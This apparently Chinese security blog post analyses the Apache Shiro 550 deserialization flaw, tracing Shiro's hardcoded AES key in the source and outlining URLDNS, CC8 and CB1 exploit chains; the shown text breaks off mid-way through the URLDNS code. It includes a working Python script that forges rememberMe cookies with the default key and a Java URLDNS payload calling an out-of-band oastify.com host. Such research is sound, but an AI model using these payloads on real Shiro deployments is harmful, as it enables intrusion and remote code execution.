<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1iF411b7bD 环境搭建搭环境看的这位师傅的，有图有步骤，爱了。https:&#x2F;&#x2F;fireline.fun&#x2F;2021&#x2F;05&#x2F;21&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550">
<meta property="og:type" content="article">
<meta property="og:title" content="shiro550反序列化">
<meta property="og:url" content="https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Jasper_sec">
<meta property="og:description" content="参考链接https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1iF411b7bD 环境搭建搭环境看的这位师傅的，有图有步骤，爱了。https:&#x2F;&#x2F;fireline.fun&#x2F;2021&#x2F;05&#x2F;21&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992080953-6b62c209-4e3b-4b03-96c1-bbdfecf0ac0f.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992887524-557ba65b-ed87-4f55-a704-ad2bd87bda38.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993027704-1fe5d6b6-592d-4e58-ad3d-018237120d85.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993320541-821444e6-7d17-4934-b21c-91c109b8cfd4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993460074-cb9159c9-eab2-422a-ab7f-fce86ad8cb65.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993648270-680fd33a-714f-4d78-b710-dc94bbd244ba.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993682635-12e6390e-c231-49b8-966e-83d446e7293a.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996088166-7a0f4482-6860-49fb-bcca-bac1f4060f4f.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996362214-cbacfc97-1239-4c2f-98d4-2499091e1cce.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997055979-52da1b14-24a8-4d88-8cd0-e8aab0d771bb.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997415675-6e10db0f-0211-4675-882d-04c26d5bd3ea.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997502363-4a93b71c-4cba-4f29-8e24-4167ec69462a.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997565433-9589bc80-6c1a-4df4-a756-ae68adc97e4e.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999017177-947cd84c-d1f3-4140-aea7-c728638989ad.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999283905-79aaf41a-aa36-42be-b5bf-3c3f06278df4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999315175-cf6b5f5c-b38c-4fb4-8454-344710dfc4d4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999853223-2530f8a9-dc3f-4f43-a174-62d3385d77f5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694000222650-5772d7a6-6ff2-436a-99c4-26f235c121c7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001180401-312875f7-c0f9-4c4d-a815-04167e5add64.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694001350649-32b68692-39fa-42b4-a4ab-5d663a366625.png#averageHue=%236dab6a&clientId=ue6e9373e-da05-4&from=paste&height=245&id=ub9e27978&originHeight=306&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50083&status=done&style=none&taskId=u79659392-fd70-47aa-a783-9369b62b04f&title=&width=1071.2">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001786024-862a8044-59ae-4816-88db-0edfc788922b.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001928851-8156d309-1739-415b-87d5-5b5dcac9c973.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694002167720-97c47687-39cd-4509-b9d9-600979d5ce47.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694003006742-1a409a1f-5c46-4f8e-a48a-8ee199c68567.png">
<meta property="article:published_time" content="2023-12-24T00:32:20.000Z">
<meta property="article:modified_time" content="2023-12-25T06:42:24.000Z">
<meta property="article:author" content="Jasper_sec">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="Shiro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992080953-6b62c209-4e3b-4b03-96c1-bbdfecf0ac0f.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>shiro550反序列化</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/12/24/0x0A%20RMI%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/12/24/0x07%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20CC7%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=shiro550反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=shiro550反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=shiro550反序列化&body=Check out this article: https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=shiro550反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=shiro550反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2023/12/24/0x08%20Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=shiro550反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <!-- 
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%91%98%E8%A6%81"><span class="toc-number">3.1.</span> <span class="toc-text">摘要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">挖洞思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">4.1.</span> <span class="toc-text">URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC8"><span class="toc-number">4.2.</span> <span class="toc-text">CC8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CB1"><span class="toc-number">4.3.</span> <span class="toc-text">CB1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
     -->
    <div id="toc">
      <div id="toc-div" class="toc-article" >
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%91%98%E8%A6%81"><span class="toc-number">3.1.</span> <span class="toc-text">摘要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%B4%9E%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">挖洞思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">4.1.</span> <span class="toc-text">URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC8"><span class="toc-number">4.2.</span> <span class="toc-text">CC8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CB1"><span class="toc-number">4.3.</span> <span class="toc-text">CB1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
        
      </div>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        shiro550反序列化
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Jasper_sec</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-12-24T00:32:20.000Z" class="dt-published" itemprop="datePublished">2023-12-24</time>
        
        (Updated: <time datetime="2023-12-25T06:42:24.000Z" class="dt-updated" itemprop="dateModified">2023-12-25</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/Shiro/" rel="tag">Shiro</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD">https://www.bilibili.com/video/BV1iF411b7bD</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>搭环境看的这位师傅的，有图有步骤，爱了。<br><a target="_blank" rel="noopener" href="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/">https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</a></p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>shiro550在hvv的时候就有所耳闻，每次看一个Java站都要看看有没有rememberMe<br>一句话说这个洞：就是rememberMe传了个经过AES加密+Base64的序列化字符串，但是Shiro里这个密钥是固定的，那我们用同样的密钥加密和Base64，传恶意的序列化字符串，后台反序列化就会被打了。</p>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992080953-6b62c209-4e3b-4b03-96c1-bbdfecf0ac0f.png" alt="image.png"></p>
<h2 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h2><p>尝试复现漏洞发现者，最初发现这个洞时的思路。<br>首先，抓包看到Cookie里的rememberMe有一大串，一般来说不会有这么多，于是猜测可能是传了序列化的对象<br>idea里双击”shift”，搜索”cookie”，找到CookieRememberMeManager这个类</p>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992887524-557ba65b-ed87-4f55-a704-ad2bd87bda38.png" alt="image.png"></p>
<p>然后发现有两个函数带了remember字样，很可能是要找的函数</p>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993027704-1fe5d6b6-592d-4e58-ad3d-018237120d85.png" alt="image.png"></p>
<p>看注释，发现getRememberedSerializedIdentity是对Cookie里的rememberMe的值进行Base64解码的</p>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993320541-821444e6-7d17-4934-b21c-91c109b8cfd4.png" alt="image.png"></p>
<p>我们的目的是探索这个字段是否可反序列化，接下来看谁调用了getRememberedSerializedIdentity，目的是看看base64解码之后，下一步是干什么。<br>这里可以看到，抽象父类的getRememberedPrincipals方法调了getRememberedSerializedIdentity</p>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993460074-cb9159c9-eab2-422a-ab7f-fce86ad8cb65.png" alt="image.png"></p>
<p>继续看getRememberedSerializedIdentity，发现它把字符串base64decode后，把结果传到了convertBytesToPrincipals这个函数里</p>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993648270-680fd33a-714f-4d78-b710-dc94bbd244ba.png" alt="image.png"></p>
<p>再跟进convertBytesToPrincipals这个函数，发现里边有个decrypt()函数，这显然是在对字符串解密<br>在字符串解密之后，直接传到deserialize()函数里，参与反序列化！<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993682635-12e6390e-c231-49b8-966e-83d446e7293a.png" alt="image.png"><br>下面看它怎么解密的，跟进decrypt，注意到这里有个获取解密密钥的函数<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996088166-7a0f4482-6860-49fb-bcca-bac1f4060f4f.png" alt="image.png"><br>跟进去getDecryptionCipherKey，他是直接返回AbstractRememberMeManager的decryptionCipherKey属性</p>
<img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996362214-cbacfc97-1239-4c2f-98d4-2499091e1cce.png" alt="image.png" style="zoom:150%;" />

<p>下面找找哪里给decryptionCipherKey赋值了，idea小技巧，”value write”里都是赋值函数<br>这里找到setDecryptionCipherKey()函数，它把传入的参数赋值给decryptionCipherKey，但是没写参数哪来的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997055979-52da1b14-24a8-4d88-8cd0-e8aab0d771bb.png" alt="image.png"><br>再找谁调用了setDecryptionCipherKey()，找到了setCipherKey()函数，这里还是没写参数哪来的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997415675-6e10db0f-0211-4675-882d-04c26d5bd3ea.png" alt="image.png"><br>再往上找，终于找到了，默认的密钥就是这个DEFAULT_CIPHER_KEY_BYTES<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997502363-4a93b71c-4cba-4f29-8e24-4167ec69462a.png" alt="image.png"><br>看注释，可以看到Shiro在这里采用AES+Base64来加密我们序列化之后的字符串<br>问题也就出在这，他这里把对称加密的密钥写死了，知道密钥，AES加密就相当于没有<br>我们按照它的构造规则，先AES再Base64，就可以打它的反序列化了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997565433-9589bc80-6c1a-4df4-a756-ae68adc97e4e.png" alt="image.png"></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据组长的视频，讲了三种利用方式：</p>
<ul>
<li>URLDNS链：JDK自带，不需要依赖，但是只能SSRF，不能RCE</li>
<li>CC8链：CC2+CC6，需要用到Commons Collections3，能RCE</li>
<li>CB1链：Shiro自带CB依赖，能直接RCE</li>
</ul>
<p>cookie加密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36</span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: VSCode</span></span><br><span class="line"><span class="comment"># @Blog    ：https://drun1baby.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同目录下放已经反序列化的文件object.ser，通过AES和BASE64加密生成rememberMe的cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;object.ser&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>这条链很短，跟过之前的链子，再回过头看真的很简单，这里直接上Exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://fbuj4kl1p0zk9fwg0my69sta319sxold.oastify.com&quot;</span>);</span><br><span class="line">        setFieldValue(url,<span class="string">&quot;hashCode&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(url,<span class="string">&quot;hashCode&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span 